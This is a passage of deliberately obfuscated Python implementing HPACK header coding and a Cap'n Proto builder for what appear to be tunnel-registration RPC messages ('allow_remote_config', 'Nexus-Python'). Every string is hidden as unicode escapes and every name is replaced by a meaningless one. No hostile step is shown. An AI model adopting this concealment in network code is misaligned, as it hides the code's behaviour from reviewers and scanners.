(codecs.decode('\\u0063\\u0061\\u0063\\u0068\\u0065\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0064\\u0069\\u0073\\u0070\\u006f\\u0073\\u0069\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0061\\u006e\\u0067\\u0075\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006f\\u006b\\u0069\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0064\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0074\\u0061\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006d\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064\\u002d\\u0073\\u0069\\u006e\\u0063\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006e\\u006f\\u006e\\u0065\\u002d\\u006d\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u0075\\u006e\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064\\u002d\\u0073\\u0069\\u006e\\u0063\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u002d\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u0069\\u006e\\u006b', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006d\\u0061\\u0078\\u002d\\u0066\\u006f\\u0072\\u0077\\u0061\\u0072\\u0064\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0066\\u0065\\u0072\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0066\\u0072\\u0065\\u0073\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0079\\u002d\\u0061\\u0066\\u0074\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0065\\u0074\\u002d\\u0063\\u006f\\u006f\\u006b\\u0069\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0074\\u0072\\u0069\\u0063\\u0074\\u002d\\u0074\\u0072\\u0061\\u006e\\u0073\\u0070\\u006f\\u0072\\u0074\\u002d\\u0073\\u0065\\u0063\\u0075\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0075\\u0073\\u0065\\u0072\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0076\\u0061\\u0072\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0076\\u0069\\u0061', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0077\\u0077\\u0077\\u002d\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
HUFFMAN_CODES = (8184, 8388568, 268435426, 268435427, 268435428, 268435429, 268435430, 268435431, 268435432, 16777194, 1073741820, 268435433, 268435434, 1073741821, 268435435, 268435436, 268435437, 268435438, 268435439, 268435440, 268435441, 268435442, 1073741822, 268435443, 268435444, 268435445, 268435446, 268435447, 268435448, 268435449, 268435450, 268435451, 20, 1016, 1017, 4090, 8185, 21, 248, 2042, 1018, 1019, 249, 2043, 250, 22, 23, 24, 0, 1, 2, 25, 26, 27, 28, 29, 30, 31, 92, 251, 32764, 32, 4091, 1020, 8186, 33, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 252, 115, 253, 8187, 524272, 8188, 16380, 34, 32765, 3, 35, 4, 36, 5, 37, 38, 39, 6, 116, 117, 40, 41, 42, 7, 43, 118, 44, 8, 9, 45, 119, 120, 121, 122, 123, 32766, 2044, 16381, 8189, 268435452, 1048550, 4194258, 1048551, 1048552, 4194259, 4194260, 4194261, 8388569, 4194262, 8388570, 8388571, 8388572, 8388573, 8388574, 16777195, 8388575, 16777196, 16777197, 4194263, 8388576, 16777198, 8388577, 8388578, 8388579, 8388580, 2097116, 4194264, 8388581, 4194265, 8388582, 8388583, 16777199, 4194266, 2097117, 1048553, 4194267, 4194268, 8388584, 8388585, 2097118, 8388586, 4194269, 4194270, 16777200, 2097119, 4194271, 8388587, 8388588, 2097120, 2097121, 4194272, 2097122, 8388589, 4194273, 8388590, 8388591, 1048554, 4194274, 4194275, 4194276, 8388592, 4194277, 4194278, 8388593, 67108832, 67108833, 1048555, 524273, 4194279, 8388594, 4194280, 33554412, 67108834, 67108835, 67108836, 134217694, 134217695, 67108837, 16777201, 33554413, 524274, 2097123, 67108838, 134217696, 134217697, 67108839, 134217698, 16777202, 2097124, 2097125, 67108840, 67108841, 268435453, 134217699, 134217700, 134217701, 1048556, 16777203, 1048557, 2097126, 4194281, 2097127, 2097128, 8388595, 4194282, 4194283, 33554414, 33554415, 16777204, 16777205, 67108842, 8388596, 67108843, 134217702, 67108844, 67108845, 134217703, 134217704, 134217705, 134217706, 134217707, 268435454, 134217708, 134217709, 134217710, 134217711, 134217712, 67108846, 1073741823)
HUFFMAN_LENGTHS = (13, 23, 28, 28, 28, 28, 28, 28, 28, 24, 30, 28, 28, 30, 28, 28, 28, 28, 28, 28, 28, 28, 30, 28, 28, 28, 28, 28, 28, 28, 28, 28, 6, 10, 10, 12, 13, 6, 8, 11, 10, 10, 8, 11, 8, 6, 6, 6, 5, 5, 5, 6, 6, 6, 6, 6, 6, 6, 7, 8, 15, 6, 12, 10, 13, 6, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 8, 7, 8, 13, 19, 13, 14, 6, 15, 5, 6, 5, 6, 5, 6, 6, 6, 5, 7, 7, 6, 6, 6, 5, 6, 7, 6, 5, 5, 6, 7, 7, 7, 7, 7, 15, 11, 14, 13, 28, 20, 22, 20, 20, 22, 22, 22, 23, 22, 23, 23, 23, 23, 23, 24, 23, 24, 24, 22, 23, 24, 23, 23, 23, 23, 21, 22, 23, 22, 23, 23, 24, 22, 21, 20, 22, 22, 23, 23, 21, 23, 22, 22, 24, 21, 22, 23, 23, 21, 21, 22, 21, 23, 22, 23, 23, 20, 22, 22, 22, 23, 22, 22, 23, 26, 26, 20, 19, 22, 23, 22, 25, 26, 26, 26, 27, 27, 26, 24, 25, 19, 21, 26, 27, 27, 26, 27, 24, 21, 21, 26, 26, 28, 27, 27, 27, 20, 24, 20, 21, 22, 21, 21, 23, 22, 22, 25, 25, 24, 24, 26, 23, 26, 27, 26, 26, 27, 27, 27, 27, 27, 28, 27, 27, 27, 27, 27, 26, 30)

def O0_fn_3():
    O0_var_436 = [None, None, -1, 0]
    for O0_var_437, (O0_var_438, O0_var_439) in enumerate(zip(HUFFMAN_CODES, HUFFMAN_LENGTHS)):
        O0_var_440 = O0_var_436
        for O0_var_441 in range(O0_var_439 - 1, -1, -1):
            O0_var_442 = O0_var_438 >> O0_var_441 & 1
            if O0_var_440[O0_var_442] is None:
                O0_var_440[O0_var_442] = [None, None, -1, O0_var_440[3] + 1]
            O0_var_440 = O0_var_440[O0_var_442]
        O0_var_440[2] = O0_var_437
    return O0_var_436
HUFFMAN_TREE = O0_fn_3()

def O0_fn_4(data):
    O0_var_443 = bytearray()
    O0_var_444 = HUFFMAN_TREE
    O0_var_445 = 0
    O0_var_446 = 0
    for O0_var_447 in data:
        for O0_var_448 in range(7, -1, -1):
            O0_var_449 = O0_var_447 >> O0_var_448 & 1
            O0_var_445 = O0_var_445 << 1 | O0_var_449
            O0_var_446 += 1
            O0_var_444 = O0_var_444[O0_var_449]
            if O0_var_444 is None:
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
            if O0_var_444[2] >= 0:
                if O0_var_444[2] == 256:
                    raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0045\\u004f\\u0053\\u0020\\u0069\\u006e\\u0073\\u0069\\u0064\\u0065\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
                O0_var_443.append(O0_var_444[2])
                O0_var_444 = HUFFMAN_TREE
                O0_var_445 = 0
                O0_var_446 = 0
    if O0_var_446 > 7 or O0_var_445 != (1 << O0_var_446) - 1:
        raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'))
    return bytes(O0_var_443)

def O0_fn_5(data, O0_var_450, O0_var_451):
    if O0_var_450 >= len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072', 'unicode_escape'))
    O0_var_452 = data[O0_var_450]
    O0_var_450 += 1
    O0_var_453 = (1 << O0_var_451) - 1
    O0_var_454 = O0_var_452 & O0_var_453
    if O0_var_454 < O0_var_453:
        return (O0_var_454, O0_var_450)
    O0_var_455 = 0
    while True:
        if O0_var_450 >= len(data):
            raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072', 'unicode_escape'))
        O0_var_456 = data[O0_var_450]
        O0_var_450 += 1
        O0_var_454 += (O0_var_456 & 127) << O0_var_455
        if O0_var_456 & 128 == 0:
            return (O0_var_454, O0_var_450)
        O0_var_455 += 7
        if O0_var_455 > 28:
            raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065', 'unicode_escape'))

def O0_fn_6(data, O0_var_457):
    if O0_var_457 >= len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
    O0_var_458 = bool(data[O0_var_457] & 128)
    O0_var_459, O0_var_457 = O0_fn_5(data, O0_var_457, 7)
    O0_var_460 = O0_var_457 + O0_var_459
    if O0_var_460 > len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'))
    O0_var_461 = data[O0_var_457:O0_var_460]
    return (O0_fn_4(O0_var_461) if O0_var_458 else O0_var_461, O0_var_460)

class HpackDecoder:

    def __init__(self):
        self.dynamic = deque()
        self.dynamic_size = 0
        self.max_size = 4096

    def table_entry(self, O0_var_462):
        if O0_var_462 <= 0:
            raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'))
        if O0_var_462 <= len(STATIC_TABLE):
            return STATIC_TABLE[O0_var_462 - 1]
        O0_var_463 = O0_var_462 - len(STATIC_TABLE) - 1
        if O0_var_463 < 0 or O0_var_463 >= len(self.dynamic):
            raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0064\\u0079\\u006e\\u0061\\u006d\\u0069\\u0063\\u0020\\u0069\\u006e\\u0064\\u0065\\u0078\\u0020\\u006f\\u0075\\u0074\\u0020\\u006f\\u0066\\u0020\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'))
        return self.dynamic[O0_var_463]

    def add(self, name, O0_var_464):
        O0_var_465 = 32 + len(name) + len(O0_var_464)
        if O0_var_465 > self.max_size:
            self.dynamic.clear()
            self.dynamic_size = 0
            return
        while self.dynamic and self.dynamic_size + O0_var_465 > self.max_size:
            O0_var_466, O0_var_467 = self.dynamic.pop()
            self.dynamic_size -= 32 + len(O0_var_466) + len(O0_var_467)
        self.dynamic.appendleft((name, O0_var_464))
        self.dynamic_size += O0_var_465

    def decode(self, data):
        O0_var_468 = []
        O0_var_469 = 0
        while O0_var_469 < len(data):
            O0_var_470 = data[O0_var_469]
            if O0_var_470 & 128:
                O0_var_471, O0_var_469 = O0_fn_5(data, O0_var_469, 7)
                O0_var_468.append(self.table_entry(O0_var_471))
                continue
            if O0_var_470 & 64:
                O0_var_471, O0_var_469 = O0_fn_5(data, O0_var_469, 6)
                if O0_var_471:
                    O0_var_472 = self.table_entry(O0_var_471)[0]
                else:
                    O0_var_473, O0_var_469 = O0_fn_6(data, O0_var_469)
                    O0_var_472 = O0_var_473.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')).lower()
                O0_var_474, O0_var_469 = O0_fn_6(data, O0_var_469)
                O0_var_475 = O0_var_474.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
                self.add(O0_var_472, O0_var_475)
                O0_var_468.append((O0_var_472, O0_var_475))
                continue
            if O0_var_470 & 32:
                O0_var_476, O0_var_469 = O0_fn_5(data, O0_var_469, 5)
                if O0_var_476 > 4096:
                    raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u0020\\u0073\\u0069\\u007a\\u0065\\u0020\\u0065\\u0078\\u0063\\u0065\\u0065\\u0064\\u0073\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074', 'unicode_escape'))
                self.max_size = O0_var_476
                while self.dynamic and self.dynamic_size > O0_var_476:
                    O0_var_477, O0_var_478 = self.dynamic.pop()
                    self.dynamic_size -= 32 + len(O0_var_477) + len(O0_var_478)
                continue
            O0_var_471, O0_var_469 = O0_fn_5(data, O0_var_469, 4)
            if O0_var_471:
                O0_var_472 = self.table_entry(O0_var_471)[0]
            else:
                O0_var_473, O0_var_469 = O0_fn_6(data, O0_var_469)
                O0_var_472 = O0_var_473.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')).lower()
            O0_var_474, O0_var_469 = O0_fn_6(data, O0_var_469)
            O0_var_468.append((O0_var_472, O0_var_474.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))))
        return O0_var_468

def O0_fn_7(O0_var_479, O0_var_480, O0_var_481):
    O0_var_482 = (1 << O0_var_480) - 1
    if O0_var_479 < O0_var_482:
        return bytes((O0_var_481 | O0_var_479,))
    O0_var_483 = bytearray((O0_var_481 | O0_var_482,))
    O0_var_479 -= O0_var_482
    while O0_var_479 >= 128:
        O0_var_483.append(O0_var_479 & 127 | 128)
        O0_var_479 >>= 7
    O0_var_483.append(O0_var_479)
    return bytes(O0_var_483)

def O0_fn_8(O0_var_484):
    O0_var_485 = O0_var_484.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) if isinstance(O0_var_484, str) else O0_var_484
    return O0_fn_7(len(O0_var_485), 7, 0) + O0_var_485

def O0_fn_9(headers):
    O0_var_486 = bytearray()
    for O0_var_487, O0_var_488 in headers:
        if O0_var_487 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_488 == codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape'):
            O0_var_486.append(136)
        elif O0_var_487 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_488 == codecs.decode('\\u0032\\u0030\\u0034', 'unicode_escape'):
            O0_var_486.append(137)
        elif O0_var_487 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_488 == codecs.decode('\\u0032\\u0030\\u0036', 'unicode_escape'):
            O0_var_486.append(138)
        elif O0_var_487 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_488 == codecs.decode('\\u0033\\u0030\\u0034', 'unicode_escape'):
            O0_var_486.append(139)
        elif O0_var_487 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_488 == codecs.decode('\\u0034\\u0030\\u0030', 'unicode_escape'):
            O0_var_486.append(140)
        elif O0_var_487 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_488 == codecs.decode('\\u0034\\u0030\\u0034', 'unicode_escape'):
            O0_var_486.append(141)
        elif O0_var_487 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_488 == codecs.decode('\\u0035\\u0030\\u0030', 'unicode_escape'):
            O0_var_486.append(142)
        else:
            O0_var_486.extend(O0_fn_7(0, 4, 0))
            O0_var_486.extend(O0_fn_8(O0_var_487))
            O0_var_486.extend(O0_fn_8(O0_var_488))
    return bytes(O0_var_486)

class CapnpBuilder:

    def __init__(self):
        self.words = []

    def alloc(self, O0_var_489):
        O0_var_490 = len(self.words)
        self.words.extend([0] * O0_var_489)
        return O0_var_490

    def struct_ptr(self, O0_var_491, O0_var_492, O0_var_493, O0_var_494):
        O0_var_495 = O0_var_492 - O0_var_491 - 1
        O0_var_496 = O0_var_495 << 2 & 4294967292
        O0_var_497 = O0_var_493 & 65535 | (O0_var_494 & 65535) << 16
        self.words[O0_var_491] = O0_var_496 | O0_var_497 << 32

    def set_u8(self, O0_var_498, O0_var_499, O0_var_500):
        O0_var_501 = 255 << O0_var_499 * 8
        self.words[O0_var_498] = self.words[O0_var_498] & ~O0_var_501 | (O0_var_500 & 255) << O0_var_499 * 8

    def set_u16(self, O0_var_502, O0_var_503, O0_var_504):
        O0_var_505 = 65535 << O0_var_503 * 8
        self.words[O0_var_502] = self.words[O0_var_502] & ~O0_var_505 | (O0_var_504 & 65535) << O0_var_503 * 8

    def set_u32(self, O0_var_506, O0_var_507, O0_var_508):
        O0_var_509 = 4294967295 << O0_var_507 * 8
        self.words[O0_var_506] = self.words[O0_var_506] & ~O0_var_509 | (O0_var_508 & 4294967295) << O0_var_507 * 8

    def set_u64(self, O0_var_510, O0_var_511):
        self.words[O0_var_510] = O0_var_511 & 18446744073709551615

    def write_bytes(self, O0_var_512, O0_var_513, text=False):
        O0_var_514 = O0_var_513.encode() if isinstance(O0_var_513, str) else bytes(O0_var_513)
        O0_var_515 = len(O0_var_514) + 1 if text else len(O0_var_514)
        O0_var_516 = self.alloc((O0_var_515 + 7) // 8)
        for O0_var_517, O0_var_518 in enumerate(O0_var_514):
            self.set_u8(O0_var_516 + O0_var_517 // 8, O0_var_517 % 8, O0_var_518)
        O0_var_519 = O0_var_516 - O0_var_512 - 1
        O0_var_520 = (O0_var_519 << 2 | 1) & 4294967295
        O0_var_521 = 2 | (O0_var_515 & 536870911) << 3
        self.words[O0_var_512] = O0_var_520 | O0_var_521 << 32

    def write_text_list(self, O0_var_522, O0_var_523):
        if not O0_var_523:
            self.words[O0_var_522] = 0
            return
        O0_var_524 = self.alloc(len(O0_var_523))
        O0_var_525 = O0_var_524 - O0_var_522 - 1
        self.words[O0_var_522] = (O0_var_525 << 2 | 1) & 4294967295 | (6 | len(O0_var_523) << 3) << 32
        for O0_var_526, O0_var_527 in enumerate(O0_var_523):
            self.write_bytes(O0_var_524 + O0_var_526, O0_var_527, True)

    def finish(self):
        return struct.pack(codecs.decode('\\u003c\\u0049\\u0049', 'unicode_escape'), 0, len(self.words)) + b''.join((struct.pack(codecs.decode('\\u003c\\u0051', 'unicode_escape'), O0_var_528) for O0_var_528 in self.words))

def O0_fn_10(O0_var_529):
    O0_var_530 = CapnpBuilder()
    O0_var_531, O0_var_532, O0_var_533 = (O0_var_530.alloc(1), O0_var_530.alloc(1), O0_var_530.alloc(1))
    O0_var_530.struct_ptr(O0_var_531, O0_var_532, 1, 1)
    O0_var_530.set_u16(O0_var_532, 0, 8)
    O0_var_534 = O0_var_530.alloc(1)
    O0_var_530.alloc(1)
    O0_var_530.struct_ptr(O0_var_533, O0_var_534, 1, 1)
    O0_var_530.set_u32(O0_var_534, 0, O0_var_529)
    return O0_var_530.finish()

def O0_fn_11(O0_var_535, O0_var_536, O0_var_537, O0_var_538, O0_var_539, O0_var_540):
    O0_var_541 = CapnpBuilder()
    O0_var_542, O0_var_543, O0_var_544 = (O0_var_541.alloc(1), O0_var_541.alloc(1), O0_var_541.alloc(1))
    O0_var_541.struct_ptr(O0_var_542, O0_var_543, 1, 1)
    O0_var_541.set_u16(O0_var_543, 0, 2)
    O0_var_545, O0_var_546, O0_var_547 = (O0_var_541.alloc(1), O0_var_541.alloc(1), O0_var_541.alloc(1))
    O0_var_548, O0_var_549, O0_var_547 = (O0_var_541.alloc(1), O0_var_541.alloc(1), O0_var_541.alloc(1))
    O0_var_541.struct_ptr(O0_var_544, O0_var_545, 3, 3)
    O0_var_541.set_u32(O0_var_545, 0, O0_var_535)
    O0_var_541.set_u64(O0_var_546, 17804583019846587543)
    O0_var_550, O0_var_551 = (O0_var_541.alloc(1), O0_var_541.alloc(1))
    O0_var_541.struct_ptr(O0_var_548, O0_var_550, 1, 1)
    O0_var_541.set_u16(O0_var_550, 4, 1)
    O0_var_552 = O0_var_541.alloc(1)
    O0_var_541.alloc(1)
    O0_var_541.struct_ptr(O0_var_551, O0_var_552, 1, 1)
    O0_var_541.set_u32(O0_var_552, 0, O0_var_536)
    O0_var_553, O0_var_547 = (O0_var_541.alloc(1), O0_var_541.alloc(1))
    O0_var_541.struct_ptr(O0_var_549, O0_var_553, 0, 2)
    O0_var_554, O0_var_555, O0_var_556, O0_var_557 = (O0_var_541.alloc(1), O0_var_541.alloc(1), O0_var_541.alloc(1), O0_var_541.alloc(1))
    O0_var_541.struct_ptr(O0_var_553, O0_var_554, 1, 3)
    O0_var_541.set_u8(O0_var_554, 0, O0_var_540)
    O0_var_558, O0_var_559 = (O0_var_541.alloc(1), O0_var_541.alloc(1))
    O0_var_541.struct_ptr(O0_var_555, O0_var_558, 0, 2)
    O0_var_541.write_bytes(O0_var_558, O0_var_537, True)
    O0_var_541.write_bytes(O0_var_559, O0_var_538)
    O0_var_541.write_bytes(O0_var_556, O0_var_539)
    O0_var_560, O0_var_561, O0_var_547 = (O0_var_541.alloc(1), O0_var_541.alloc(1), O0_var_541.alloc(1))
    O0_var_541.struct_ptr(O0_var_557, O0_var_560, 1, 2)
    O0_var_562, O0_var_563, O0_var_564, O0_var_565 = (O0_var_541.alloc(1), O0_var_541.alloc(1), O0_var_541.alloc(1), O0_var_541.alloc(1))
    O0_var_541.struct_ptr(O0_var_561, O0_var_562, 0, 4)
    O0_var_541.write_bytes(O0_var_562, uuid.uuid4().bytes)
    O0_var_541.write_text_list(O0_var_563, [codecs.decode('\\u0073\\u0065\\u0072\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0064\\u005f\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c\\u006f\\u0077\\u005f\\u0072\\u0065\\u006d\\u006f\\u0074\\u0065\\u005f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067', 'unicode_escape')])
    O0_var_541.write_bytes(O0_var_564, codecs.decode('\\u0032\\u0030\\u0032\\u0034\\u002e\\u0031\\u0030\\u002e\\u0030\\u002d\\u004e\\u0065\\u0078\\u0075\\u0073', 'unicode_escape'), True)
    O0_var_541.write_bytes(O0_var_565, codecs.decode('\\u004e\\u0065\\u0078\\u0075\\u0073\\u002d\\u0050\\u0079\\u0074\\u0068\\u006f\\u006e', 'unicode_escape'), True)
    return O0_var_541.finish()

def O0_fn_12(O0_var_566):
    O0_var_567 = []
    O0_var_568 = 0
    while len(O0_var_566) - O0_var_568 >= 8:
        O0_var_569, O0_var_570 = struct.unpack_from(codecs.decode('\\u003c\\u0049\\u0049', 'unicode_escape'), O0_var_566, O0_var_568)
        O0_var_571 = O0_var_569 + 1
        O0_var_572 = 2 + O0_var_571
        O0_var_573 = O0_var_572 * 4
        if O0_var_573 % 8:
            O0_var_573 += 4
        if len(O0_var_566) - O0_var_568 < O0_var_573:
            break
        O0_var_574 = [O0_var_570]
        for O0_var_575 in range(1, O0_var_571):
